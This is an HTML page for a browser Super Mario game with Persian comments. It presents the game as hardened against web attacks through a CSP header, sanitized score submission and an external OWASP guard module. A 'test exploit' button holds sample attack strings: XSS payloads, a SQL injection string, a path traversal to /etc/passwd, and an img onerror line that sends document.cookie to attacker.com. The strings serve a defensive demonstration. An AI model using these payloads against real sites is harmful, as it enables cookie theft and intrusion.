<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- سخت‌گیرانه‌ترین سیاست امنیتی محتوا (CSP) برای مسدودسازی هرگونه اجرای کد ناشناس و نشت توکن -->
    <meta http-equiv="Content-Security-Policy" content="
        default-src 'self';
        script-src 'self' 'unsafe-inline';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: blob:;
        connect-src 'self';
        object-src 'none';
        base-uri 'self';
        form-action 'self';
    ">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Super Mario - B2.st Hardened Edition</title>
    <style>
        :root {
            --sky-blue: #5c94fc;
            --brick-red: #b84418;
            --ground-green: #00a800;
            --hud-bg: rgba(0, 0, 0, 0.75);
            --shield-active: #00ff66;
        }

        * {
            box-sizing: border-box;
            user-select: none;
        }

        body {
            margin: 0;
            padding: 0;
            background-color: #111;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
        }

        #game-container {
            position: relative;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8), 0 0 10px rgba(92, 148, 252, 0.4);
            border-radius: 8px;
            overflow: hidden;
            border: 3px solid #333;
            background: var(--sky-blue);
        }

        canvas {
            display: block;
            background: var(--sky-blue);
            image-rendering: pixelated;
        }

        #ui-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 800px;
            background: #222;
            padding: 10px 16px;
            border-top: 2px solid #444;
            font-size: 14px;
        }

        .hud-stat {
            display: flex;
            gap: 6px;
            align-items: center;
            font-weight: bold;
        }

        .hud-stat span {
            color: #ffd700;
        }

        .sec-badge {
            background: #004411;
            color: var(--shield-active);
            padding: 4px 10px;
            border-radius: 4px;
            border: 1px solid #00aa33;
            font-size: 11px;
            letter-spacing: 0.5px;
        }

        #score-submission-panel {
            width: 800px;
            background: #1a1a1a;
            padding: 12px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-bottom: 2px solid #333;
        }

        input[type="text"] {
            background: #2b2b2b;
            border: 1px solid #444;
            padding: 8px 12px;
            color: #fff;
            border-radius: 4px;
            outline: none;
            flex: 1;
            font-size: 13px;
        }

        input[type="text"]:focus {
            border-color: #5c94fc;
        }

        button {
            background: #b84418;
            color: white;
            border: none;
            padding: 8px 18px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            transition: background 0.2s;
        }

        button:hover {
            background: #d85420;
        }

        #security-log {
            width: 800px;
            background: #0a0a0a;
            color: #00ff66;
            font-family: 'Courier New', Courier, monospace;
            font-size: 11px;
            padding: 8px 12px;
            height: 60px;
            overflow-y: auto;
            border-bottom: 1px solid #222;
        }

        .threat-alert {
            color: #ff3333 !important;
            font-weight: bold;
        }

        #leaderboard {
            width: 800px;
            background: #181818;
            padding: 10px 16px;
            font-size: 13px;
        }

        #leaderboard ul {
            list-style: none;
            padding: 0;
            margin: 6px 0 0 0;
            display: flex;
            gap: 20px;
        }

        #leaderboard li {
            background: #242424;
            padding: 4px 10px;
            border-radius: 4px;
            border-right: 3px solid #5c94fc;
        }
    </style>
</head>
<body>

    <!-- نوار وضعیت امنیتی و ثبت رکورد امن -->
    <div id="score-submission-panel">
        <label for="player-name">شناسه بازیکن:</label>
        <input type="text" id="player-name" maxlength="25" placeholder="نام بازیکن (تست تزریق XSS یا SQLi)">
        <button id="btn-submit-score">ثبت امن رکورد</button>
        <button id="btn-test-exploit" style="background:#555;">تست نفوذ XSS</button>
    </div>

    <!-- لاگ زنده فایروال نرم‌افزاری OWASP -->
    <div id="security-log">> B2.st OWASP Guard Initialized. Sinks Protected. Ready.</div>

    <!-- کانتینر بوم بازی ماریو -->
    <div id="game-container">
        <canvas id="mario-canvas" width="800" height="400"></canvas>
    </div>

    <!-- نوار HUD وضعیت بازی -->
    <div id="ui-bar">
        <div class="hud-stat">ماریو: <span id="hud-score">000000</span></div>
        <div class="hud-stat">سکه‌ها: <span id="hud-coins">00</span></div>
        <div class="hud-stat">جهان: <span>1-1</span></div>
        <div class="hud-stat">زمان: <span id="hud-time">400</span></div>
        <div class="sec-badge">🛡️ OWASP ACTIVE: NO-SINK-LEAK</div>
    </div>

    <!-- تابلوی امتیازات امن -->
    <div id="leaderboard">
        <strong>برترین رکوردهای ثبت‌شده (ایزوله‌شده علیه Stored XSS):</strong>
        <ul id="scores-list">
            <li>MarioHero: 5200</li>
            <li>Luigi_Pro: 4100</li>
        </ul>
    </div>

    <!-- لود ماژول فایروال امنیتی OWASP -->
    <script src="src/security/owasp_guard.js"></script>

    <!-- موتور بازی ماریو ایمن‌سازی‌شده -->
    <script>
        (function () {
            'use strict';

            const logElement = document.getElementById('security-log');

            function appendLog(message, isThreat = false) {
                const entry = document.createElement('div');
                if (isThreat) entry.classList.add('threat-alert');
                entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
                logElement.appendChild(entry);
                logElement.scrollTop = logElement.scrollHeight;
            }

            // ۱. تنظیم نشست امن با کلید درون حافظه (Memory Vault)
            async function bootstrapSecuritySession() {
                try {
                    // شبیه‌سازی دریافت توکن محرمانه از بک‌اند
                    const mockSecureJwt = 'b2st_session_token_' + Math.random().toString(36).substring(2);
                    await OwaspGuard.Vault.setSessionToken(mockSecureJwt, 1800000);
                    OwaspGuard.Vault.setCsrfToken('csrf_token_' + Math.random().toString(36).substring(2));
                    appendLog('Secure In-Memory Token Vault successfully primed. No webStorage tokens.');
                } catch (err) {
                    appendLog('Failed to seed session token: ' + err.message, true);
                }
            }
            bootstrapSecuritySession();

            // ۲. موتور بازی کلاسیک ماریو بر بستر HTML5 Canvas
            const canvas = document.getElementById('mario-canvas');
            const ctx = canvas.getContext('2d');

            const GAME = {
                score: 0,
                coins: 0,
                time: 400,
                gravity: 0.45,
                friction: 0.82
            };

            const mario = {
                x: 50,
                y: 300,
                w: 24,
                h: 32,
                vx: 0,
                vy: 0,
                speed: 4.5,
                jumpForce: -11.5,
                grounded: false,
                color: '#d62d20'
            };

            const platforms = [
                { x: 0, y: 360, w: 1200, h: 40, type: 'ground' },
                { x: 180, y: 260, w: 80, h: 20, type: 'brick' },
                { x: 300, y: 200, w: 100, h: 20, type: 'question' },
                { x: 440, y: 260, w: 80, h: 20, type: 'brick' },
                { x: 580, y: 160, w: 60, h: 20, type: 'question' }
            ];

            const coinsList = [
                { x: 320, y: 160, collected: false },
                { x: 360, y: 160, collected: false },
                { x: 600, y: 120, collected: false }
            ];

            const keys = {};

            window.addEventListener('keydown', (e) => {
                keys[e.code] = true;
            });

            window.addEventListener('keyup', (e) => {
                keys[e.code] = false;
            });

            function updateGame() {
                // کنترل حرکت
                if (keys['ArrowRight'] || keys['KeyD']) {
                    if (mario.vx < mario.speed) mario.vx++;
                }
                if (keys['ArrowLeft'] || keys['KeyA']) {
                    if (mario.vx > -mario.speed) mario.vx--;
                }
                if ((keys['ArrowUp'] || keys['KeyW'] || keys['Space']) && mario.grounded) {
                    mario.vy = mario.jumpForce;
                    mario.grounded = false;
                }

                mario.vx *= GAME.friction;
                mario.vy += GAME.gravity;

                mario.x += mario.vx;
                mario.y += mario.vy;

                // مرز چپ بازی
                if (mario.x < 0) mario.x = 0;

                // بررسی برخورد با پلتفرم‌ها
                mario.grounded = false;
                for (let plat of platforms) {
                    if (
                        mario.x < plat.x + plat.w &&
                        mario.x + mario.w > plat.x &&
                        mario.y + mario.h > plat.y &&
                        mario.y + mario.h < plat.y + plat.h + mario.vy
                    ) {
                        mario.grounded = true;
                        mario.vy = 0;
                        mario.y = plat.y - mario.h;
                    }
                }

                // برخورد با سکه‌ها
                coinsList.forEach(coin => {
                    if (!coin.collected) {
                        const dist = Math.hypot((mario.x + mario.w / 2) - coin.x, (mario.y + mario.h / 2) - coin.y);
                        if (dist < 20) {
                            coin.collected = true;
                            GAME.coins += 1;
                            GAME.score += 200;
                            document.getElementById('hud-score').textContent = String(GAME.score).padStart(6, '0');
                            document.getElementById('hud-coins').textContent = String(GAME.coins).padStart(2, '0');
                        }
                    }
                });

                // دوربین تعقیب‌کننده
                let cameraOffset = Math.max(0, mario.x - 300);

                // رندرینگ فریم
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.save();
                ctx.translate(-cameraOffset, 0);

                // رسم پلتفرم‌ها و زمین
                platforms.forEach(plat => {
                    if (plat.type === 'ground') {
                        ctx.fillStyle = '#b84418';
                        ctx.fillRect(plat.x, plat.y, plat.w, plat.h);
                        ctx.fillStyle = '#00a800';
                        ctx.fillRect(plat.x, plat.y, plat.w, 8);
                    } else if (plat.type === 'brick') {
                        ctx.fillStyle = '#b84418';
                        ctx.fillRect(plat.x, plat.y, plat.w, plat.h);
                        ctx.strokeStyle = '#000';
                        ctx.strokeRect(plat.x, plat.y, plat.w, plat.h);
                    } else if (plat.type === 'question') {
                        ctx.fillStyle = '#fcb040';
                        ctx.fillRect(plat.x, plat.y, plat.w, plat.h);
                        ctx.fillStyle = '#fff';
                        ctx.font = 'bold 12px monospace';
                        ctx.fillText('?', plat.x + plat.w / 2 - 4, plat.y + 14);
                    }
                });

                // رسم سکه‌ها
                coinsList.forEach(coin => {
                    if (!coin.collected) {
                        ctx.fillStyle = '#ffd700';
                        ctx.beginPath();
                        ctx.arc(coin.x, coin.y, 8, 0, Math.PI * 2);
                        ctx.fill();
                        ctx.strokeStyle = '#b8860b';
                        ctx.stroke();
                    }
                });

                // رسم ماریو
                ctx.fillStyle = mario.color;
                ctx.fillRect(mario.x, mario.y, mario.w, mario.h);
                // کلاه و جزئیات ماریو
                ctx.fillStyle = '#002699';
                ctx.fillRect(mario.x + 4, mario.y + 16, mario.w - 8, 12);
                ctx.fillStyle = '#ffcca3';
                ctx.fillRect(mario.x + 6, mario.y + 4, 14, 10);

                ctx.restore();

                requestAnimationFrame(updateGame);
            }

            requestAnimationFrame(updateGame);

            // ۳. مدیریت امن ثبت رتبه و اعتبارسنجی لایه ورودی
            document.getElementById('btn-submit-score').addEventListener('click', async () => {
                const nameInput = document.getElementById('player-name');
                const rawName = nameInput.value;

                try {
                    // تایید اعتبار با فایروال OWASP
                    const securePayload = OwaspGuard.secureScorePayload(rawName, GAME.score);
                    
                    // استخراج ایمن توکن نشست
                    const token = await OwaspGuard.Vault.getSessionToken();
                    
                    appendLog(`Payload Sanitized: Player=${securePayload.player} | Sig=${securePayload.hmacSignature} | Auth=OK`);

                    // افزودن امن به تابلوی امتیازات بدون استفاده از innerHTML آسیب‌پذیر
                    const list = document.getElementById('scores-list');
                    const item = document.createElement('li');
                    
                    // استفاده از textContent جهت مسدودسازی دائمی DOM XSS
                    item.textContent = `${securePayload.player}: ${securePayload.score}`;
                    list.appendChild(item);

                    nameInput.value = '';
                } catch (err) {
                    appendLog(`[DEFENSE HIT] ${err.message}`, true);
                }
            });

            // ۴. دکمه شبیه‌ساز حمله نفوذگر برای تست تاب‌آوری WAF
            document.getElementById('btn-test-exploit').addEventListener('click', () => {
                const exploits = [
                    "<script>alert('XSS_PWNED')<\/script>",
                    "Mario' OR '1'='1' --",
                    "<img src=x onerror=fetch('http://attacker.com?leak='+document.cookie)>",
                    "../../etc/passwd",
                    "Mario<svg onload=alert(1)>"
                ];
                const testVector = exploits[Math.floor(Math.random() * exploits.length)];
                document.getElementById('player-name').value = testVector;
                appendLog(`Simulating Injected Vector: ${testVector}`, true);
            });

            // ۵. پاکسازی پارامترهای URL ورودی جهت جلوگیری از Reflected DOM XSS
            (function sanitizeURLParams() {
                try {
                    const urlParams = new URLSearchParams(window.location.search);
                    const incomingPlayer = urlParams.get('player');
                    if (incomingPlayer) {
                        OwaspGuard.validateInput(incomingPlayer, 'URL_PARAM');
                        document.getElementById('player-name').value = OwaspGuard.sanitizeHTML(incomingPlayer);
                        appendLog(`Safe URL Query Parameter loaded: ${incomingPlayer}`);
                    }
                } catch (err) {
                    appendLog(`Malicious URL query neutralized: ${err.message}`, true);
                    window.history.replaceState({}, document.title, window.location.pathname);
                }
            })();

        })();
    </script>
</body>
</html>
